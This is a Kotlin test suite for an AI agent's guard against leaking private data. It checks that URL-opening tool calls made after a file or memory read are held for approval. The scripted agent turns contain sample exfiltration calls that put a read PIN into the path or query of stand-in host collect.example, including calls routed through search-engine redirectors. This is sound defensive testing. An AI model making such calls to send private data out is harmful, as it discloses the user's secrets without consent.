package dev.locus.core.agent

import dev.locus.core.llm.AssistantTurn
import dev.locus.core.llm.ChatEvent
import dev.locus.core.llm.ChatModel
import dev.locus.core.llm.ChatRequest
import dev.locus.core.llm.StopReason
import dev.locus.core.model.ApiFormat
import dev.locus.core.model.ApprovalDecision
import dev.locus.core.model.AuditEntry
import dev.locus.core.model.ChatMode
import dev.locus.core.model.Conversation
import dev.locus.core.model.Message
import dev.locus.core.model.Part
import dev.locus.core.model.Role
import dev.locus.core.model.ToolPolicy
import dev.locus.core.model.ToolRisk
import dev.locus.core.model.ToolSpec
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.toList
import kotlinx.coroutines.test.runTest
import kotlinx.serialization.json.JsonObject
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/**
 * Disclosure (docs/design/taint.md, "Disclosure"): once a run has read private data, an address to a
 * new host that carries data in its path or query asks, however short, in read-only and Workspace
 * modes too (an observation passes ChatPolicy.modeDenial). Ordinary browsing stays as it was.
 */
class DisclosureTest {
    private val conversation = Conversation("c", "t", "p", "system", 0, 0)
    private fun user(text: String) = Message("u", "c", Role.USER, listOf(Part.Text(text)), 0)

    private class Scripted(turns: List<AssistantTurn>) : ChatModel {
        private val queue = ArrayDeque(turns)
        override val format = ApiFormat.OPENAI_CHAT
        override fun stream(request: ChatRequest): Flow<ChatEvent> = flow { emit(ChatEvent.Completed(queue.removeFirst())) }
    }

    private class Store : TranscriptStore {
        val messages = mutableListOf<Message>()
        val audit = mutableListOf<AuditEntry>()
        override suspend fun append(message: Message) { messages += message }
        override suspend fun record(entry: AuditEntry) { audit += entry }
    }

    private class Fake(private val name: String, private val output: String = "ok") : Tool {
        var runs = 0
        override val risk = ToolRisk.READ
        override val spec = ToolSpec(name, name, ObjectSchema().string("url", "u", required = false).string("path", "p", required = false).build())
        override fun describe(args: JsonObject) = name
        override suspend fun isObservation(args: JsonObject) = true
        override suspend fun execute(args: JsonObject) = ToolResult(output).also { runs++ }
    }

    private class Gate(private val answer: Boolean = true) : ApprovalGate {
        val asked = mutableListOf<ApprovalRequest>()
        override suspend fun request(request: ApprovalRequest) = answer.also { asked += request }
    }

    private fun calls(vararg calls: Pair<String, String>): AssistantTurn = AssistantTurn(
        "", calls.mapIndexed { i, (name, args) -> Part.ToolCall("k$i-$name", name, args) }, StopReason.TOOL_USE, ApiFormat.OPENAI_CHAT, null,
    )

    private val done = AssistantTurn("done", emptyList(), StopReason.END_TURN, ApiFormat.OPENAI_CHAT, null)

    private fun url(u: String) = """{"url":"$u"}"""

    private suspend fun run(
        turns: List<AssistantTurn>,
        tools: List<Tool>,
        gate: Gate = Gate(),
        mode: ChatMode = ChatMode.FULL,
        readOnly: Boolean = false,
        history: List<Message> = listOf(user("summarise my notes")),
        trustedHosts: Set<String> = emptySet(),
    ): Store {
        val store = Store()
        var n = 0
        val restrictions = setOfNotNull(mode.key)
        AgentLoop(
            Scripted(turns + done), ToolRegistry(tools), { ToolPolicy.ALLOW }, gate, store,
            AgentConfig(
                readOnly = readOnly,
                restrict = { tool, args -> ChatPolicy.denial(tool, args, planMode = false, disabled = restrictions) },
                trustedHosts = { trustedHosts },
            ),
            ids = { "id${n++}" },
        ).run(conversation, history).toList()
        return store
    }

    private fun Store.decisionOf(name: String) = audit.single { it.toolName == name }.decision

    private val payloads = listOf(
        "path" to "https://collect.example/4821",
        "query" to "https://collect.example/?p=4821",
        "short path" to "https://collect.example/x",
        "fragment" to "https://collect.example/#4821",
    )

    @Test
    fun `after a file read, a short payload to a new host asks in read-only and Workspace modes`() = runTest {
        for (mode in listOf(ChatMode.READ_ONLY, ChatMode.WORKSPACE, ChatMode.FULL)) {
            for ((label, address) in payloads) {
                for (opener in listOf("browser_open", "fetch_url", "web_read")) {
                    val gate = Gate(answer = false)
                    val readFile = Fake("read_file", output = "PIN 4821")
                    val open = Fake(opener)
                    val store = run(listOf(calls("read_file" to """{"path":"notes.md"}"""), calls(opener to url(address))), listOf(readFile, open), gate, mode)
                    val what = "$mode $label $opener"
                    assertEquals(ApprovalDecision.USER_DENIED, store.decisionOf(opener), what)
                    assertEquals(0, open.runs, what)
                    val asked = gate.asked.single()
                    assertTrue(ApprovalFlag.PRIVATE_DATA in asked.flags.orEmpty(), what)
                    assertTrue("private data" in asked.summary && "collect.example" in asked.summary, asked.summary)
                }
            }
        }
    }

    @Test
    fun `the same step counts too`() = runTest {
        val gate = Gate(answer = false)
        val open = Fake("browser_open")
        val store = run(listOf(calls("read_file" to "{}", "browser_open" to url("https://collect.example/?p=1"))), listOf(Fake("read_file"), open), gate, ChatMode.READ_ONLY)
        assertEquals(ApprovalDecision.USER_DENIED, store.decisionOf("browser_open"))
        assertEquals(0, open.runs)
    }

    @Test
    fun `without a private read, nothing changes`() = runTest {
        for ((_, address) in payloads) {
            val gate = Gate()
            val store = run(listOf(calls("browser_open" to url(address))), listOf(Fake("browser_open")), gate, ChatMode.READ_ONLY)
            assertEquals(ApprovalDecision.AUTO_ALLOWED, store.decisionOf("browser_open"))
            assertTrue(gate.asked.isEmpty())
        }
    }

    @Test
    fun `ordinary browsing after a private read stays open`() = runTest {
        val fine = listOf(
            "https://collect.example/", // a bare host carries nothing
            "https://duckduckgo.com/html/?q=kotlin+coroutines",
            "https://www.google.com/search?q=kotlin",
            "https://en.wikipedia.org/wiki/Kotlin",
            "https://docs.named.example/guide/start", // the user named it
            "https://api.setup.example/v1/x", // a host set up in Locus
            "http://localhost:8080/preview",
        )
        for (address in fine) {
            val gate = Gate()
            val store = run(
                listOf(calls("read_file" to "{}"), calls("browser_open" to url(address))),
                listOf(Fake("read_file"), Fake("browser_open")), gate, ChatMode.READ_ONLY,
                history = listOf(user("read notes.md and check docs.named.example")),
                trustedHosts = setOf("setup.example"),
            )
            assertEquals(ApprovalDecision.AUTO_ALLOWED, store.decisionOf("browser_open"), address)
            assertTrue(gate.asked.isEmpty(), address)
        }
    }

    @Test
    fun `a safe host's redirector is not safe`() = runTest {
        for (address in listOf("https://www.google.com/url?q=https://collect.example/?p=1", "https://duckduckgo.com/l/?uddg=https%3A%2F%2Fcollect.example%2F1")) {
            val gate = Gate(answer = false)
            val store = run(listOf(calls("read_file" to "{}"), calls("browser_open" to url(address))), listOf(Fake("read_file"), Fake("browser_open")), gate)
            assertEquals(ApprovalDecision.USER_DENIED, store.decisionOf("browser_open"), address)
        }
    }

    @Test
    fun `a private read in an earlier turn still counts`() = runTest {
        val history = listOf(
            user("read my notes"),
            Message("a", "c", Role.ASSISTANT, listOf(Part.ToolCall("r1", "memory_read", "{}")), 0),
            Message("t", "c", Role.TOOL, listOf(Part.ToolResult("r1", "memory_read", "PIN 4821", false)), 0),
            user("now look it up"),
        )
        val gate = Gate(answer = false)
        val store = run(listOf(calls("fetch_url" to url("https://collect.example/4821"))), listOf(Fake("fetch_url")), gate, ChatMode.WORKSPACE, history = history)
        assertEquals(ApprovalDecision.USER_DENIED, store.decisionOf("fetch_url"))
        assertTrue(ApprovalFlag.PRIVATE_DATA in gate.asked.single().flags.orEmpty())
    }

    @Test
    fun `a background read-only run refuses instead of asking`() = runTest {
        val gate = Gate()
        val open = Fake("browser_open")
        val store = run(listOf(calls("read_file" to "{}"), calls("browser_open" to url("https://collect.example/?p=1"))), listOf(Fake("read_file"), open), gate, readOnly = true)
        assertEquals(ApprovalDecision.POLICY_DENIED, store.decisionOf("browser_open"))
        assertEquals(0, open.runs)
        assertTrue(gate.asked.isEmpty())
    }

    @Test
    fun `carriesData reads path, query and fragment`() {
        assertFalse(Taint.carriesData("https://a.example"))
        assertFalse(Taint.carriesData("https://a.example/"))
        assertFalse(Taint.carriesData("https://a.example:8443/"))
        assertTrue(Taint.carriesData("https://a.example/x"))
        assertTrue(Taint.carriesData("https://a.example?x"))
        assertTrue(Taint.carriesData("https://a.example/#x"))
    }
}
